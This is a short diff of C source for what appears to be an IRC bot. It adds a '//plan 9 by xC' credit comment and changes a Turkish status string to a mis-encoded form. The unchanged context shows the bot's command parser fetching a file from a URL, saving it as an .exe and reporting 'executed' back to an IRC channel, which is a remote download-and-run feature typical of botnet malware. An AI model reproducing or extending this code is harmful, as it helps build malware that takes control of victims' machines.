@@ -1,3 +1,5 @@
+//plan 9 by xC
+
 #include "inc.h"
 char channel[32]= "#channel";
 char server[32]= "server";
@@ -106,7 +108,7 @@ void iparse(char *commands)
 	     strcat(fileto,".exe");
  
 	     if (getfile(url,fileto)) {
-			 sprintf(msg, "PRIVMSG %s :Çalıştırıldı [%s]\n", channel, url);
+			 sprintf(msg, "PRIVMSG %s :Ã‡alÃ½Ã¾tÃ½rÃ½ldÃ½ [%s]\n", channel, url);
 	         send(sock, msg, strlen(msg), 0);
 		 }
  
